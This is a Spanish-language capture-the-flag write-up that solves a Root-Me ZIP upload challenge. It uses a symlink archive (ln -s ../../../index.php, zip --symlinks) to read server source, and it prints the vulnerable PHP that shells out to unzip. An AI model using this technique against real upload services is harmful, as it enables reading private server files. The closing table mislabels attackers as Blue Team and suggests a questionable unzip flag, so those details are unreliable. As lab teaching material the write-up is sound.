File Upload - ZIP | Root-Me Challenge Writeup

    Categoría: Web-Server | Dificultad: 3% | Puntos: 30 | Validaciones: 10856

📋 Índice

    Descripción del Reto

    Reconocimiento y Estructura

    Identificación de la Vulnerabilidad

    Explotación con Symlink

    Obtención de la Flag

    Lecciones Aprendidas

📝 Descripción del Reto

El reto consiste en un formulario de subida de archivos que acepta archivos ZIP y los descomprime en el servidor. El objetivo es leer el archivo index.php para obtener la flag.

Pista del reto: "Unsafe decompression"
🔍 Reconocimiento y Estructura
1. Acceso al formulario

El reto presenta un formulario simple de subida de archivos:
html

<form enctype="multipart/form-data" method="post" action>
    <input name="zipfile" type="file">
    <button type="submit">Submit</button>
</form>

2. Pruebas iniciales

Subimos un archivo de prueba para ver dónde se almacena:
bash

echo "test" > test.txt
zip test.zip test.txt

Después de subir, el servidor nos devuelve la URL:
text

http://challenge01.root-me.org/web-serveur/ch51/tmp/upload/6a5903b8922312.58943614/

3. Estructura de directorios

Accediendo a la URL principal, podemos ver la estructura del servidor:
text

/web-serveur/
├── ch1/
├── ch2/
├── ...
├── ch51/              ← Directorio del reto
│   ├── index.php      ← Objetivo
│   └── tmp/
│       └── upload/
│           └── 6a5903b8922312.58943614/  ← Nuestro directorio
│               ├── link.txt
│               └── 401be6b31c4865396a707053d01b631c.zip
└── ch52/
    └── ...

Ubicación actual:
text

/web-serveur/ch51/tmp/upload/6a5903b8922312.58943614/

Para llegar a index.php:
text

/web-serveur/ch51/index.php

Vulnerabilidad encontrada

    Descompresión insegura: El servidor usa unzip sin sanitizar las rutas dentro del ZIP

    Symlinks permitidos: No hay restricción contra enlaces simbólicos

    Path traversal: Podemos usar ../ para salir del directorio de subida

Pruebas de path traversal

Probando diferentes niveles de ../:
Path	Niveles	Resultado
../index.php	1	❌ No existe
../../index.php	2	❌ No existe
../../../index.php	3	✅ ¡Encontrado!
../../../../index.php	4	❌ No existe
../../../../../index.php	5	❌ No existe

Conclusión: index.php está exactamente a 3 niveles de nuestro directorio.
💣 Explotación con Symlink
Método elegido: Symlink

Usaremos un enlace simbólico que apunte a index.php para leer su contenido.
Paso 1: Crear el symlink
bash

# Crear enlace simbólico a index.php
# ../../../ sube 3 niveles hasta /web-serveur/ch51/
ln -s ../../../index.php link.txt

Verificación:
bash

ls -la link.txt
# link.txt -> ../../../index.php

Paso 2: Crear el ZIP con el symlink
bash

# La opción --symlinks es CRUCIAL para mantener el enlace
zip --symlinks payload.zip link.txt

Salida:
text

  adding: link.txt (stored 0%)

Paso 3: Verificar el ZIP
bash

unzip -l payload.zip

Salida:
text

Archive:  payload.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
       24  2026-07-16 18:13   link.txt
---------                     -------
       24                     1 file

Paso 4: Subir el archivo

    Seleccionamos payload.zip en el formulario

    Hacemos clic en "Submit"

    El servidor nos devuelve la URL de nuestro directorio

Captura del directorio tras la subida:
text

/web-serveur/ch51/tmp/upload/6a5903219bd875.65065953/
File Name         File Size    Date
Parent directory/  -            -
401be...zip       190 B        2026-Jul-16 18:13
link.txt          24 B         2026-Jul-16 18:13

Paso 5: Acceder al symlink
text

http://challenge01.root-me.org/web-serveur/ch51/tmp/upload/6a5903b8922312.58943614/link.txt

🏁 Obtención de la Flag

Al acceder a link.txt, el servidor sigue el enlace simbólico y muestra el contenido de index.php:
php

<?php
if(isset($_FILES['zipfile'])){
    if($_FILES['zipfile']['type']==="application/zip" || 
       $_FILES['zipfile']['type']==="application/x-zip-compressed" || 
       $_FILES['zipfile']['type']==="application/octet-stream"){
        
        $uploaddir = 'tmp/upload/'.uniqid("", true).'/';
        mkdir($uploaddir, 0750, true);
        $uploadfile = $uploaddir . md5(basename($_FILES['zipfile']['name'])).'.zip';
        
        if (move_uploaded_file($_FILES['zipfile']['tmp_name'], $uploadfile)) {
            $message = "<p>File uploaded</p> ";
        }
        else{
            $message = "<p>Error!</p>";
        }
    
        $zip = new ZipArchive;
        if ($zip->open($uploadfile)) {
            // Don't know if this is safe, but it works, someone told me the flag is ************************* , did not understand what it means
            exec("/usr/bin/timeout -k2 3 /usr/bin/unzip '$uploadfile' -d '$uploaddir'", $output, $ret);
            $message = "<p>File unzipped <a href='".$uploaddir."'>here</a>.</p>";
            $zip->close();
        }
        else{
            $message = "<p> Decompression Error </p>";
        }
    }
    else{
        $message = "<p> Error bad file type ! <p>";
    }
}
?>


Traducción: Never Trust User Input (Nunca confíes en la entrada del usuario)
📚 Lecciones Aprendidas
Para los atacantes (Blue Team)
Técnica	Descripción	En este reto
Symlinks	Enlaces simbólicos a archivos sensibles	ln -s ../../../index.php link.txt
Path Traversal	../ para salir del directorio	3 niveles hasta /web-serveur/ch51/
ZIP con symlinks	zip --symlinks para mantener enlaces	Crucial para que funcione
Para los defensores (Red Team)
Medida de seguridad	Implementación
Validar rutas	Usar realpath() para comprobar que los archivos están dentro del directorio permitido
Deshabilitar symlinks	Usar unzip -x o --no-symlinks
Sanitizar nombres	Eliminar ../ y .../ de los nombres de archivo
No almacenar flags	No poner flags en comentarios del código
